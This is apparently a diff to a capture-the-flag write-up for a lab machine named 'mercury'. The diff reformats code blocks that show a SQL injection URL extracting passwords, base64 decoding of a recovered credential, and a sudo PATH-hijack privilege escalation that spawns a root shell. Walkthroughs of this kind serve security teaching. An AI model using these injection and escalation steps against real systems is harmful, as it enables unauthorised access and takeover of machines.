@@ -29,8 +29,7 @@ http://10.0.2.5:8080/mercuryfacts/1 UNION SELECT password from users--/
 
 ## Base64 decode the password
 {% highlight sh %}
-┌─[alienum@parrot]─[~/Desktop]
-└──╼ $echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
+echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
 mercurymeandiameteris4880km
 {% endhighlight %}
 
@@ -38,22 +37,19 @@ mercurymeandiameteris4880km
 
 - linuxmaster:mercurymeandiameteris4880km
 
-{% highlight sh %}
-linuxmaster@mercury:~$ sudo -l
-[sudo] password for linuxmaster:
-Matching Defaults entries for linuxmaster on mercury:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+```sh
+(root : root) SETENV: /usr/bin/check_syslog.sh
+```
 
-User linuxmaster may run the following commands on mercury:
-    (root : root) SETENV: /usr/bin/check_syslog.sh
-
-linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
+```sh
+cat /usr/bin/check_syslog.sh
 #!/bin/bash
 tail -n 10 /var/log/syslog
-linuxmaster@mercury:~$ echo "/bin/bash" > tail
-linuxmaster@mercury:~$ chmod 777 tail
-linuxmaster@mercury:~$ export PATH=.:$PATH
-linuxmaster@mercury:~$ sudo PATH=$PATH /usr/bin/check_syslog.sh
-root@mercury:/home/linuxmaster#
-{% endhighlight %}
+```
+
+```sh
+echo "/bin/bash" > tail
+chmod 777 tail
+export PATH=.:$PATH
+sudo PATH=$PATH /usr/bin/check_syslog.sh
+```
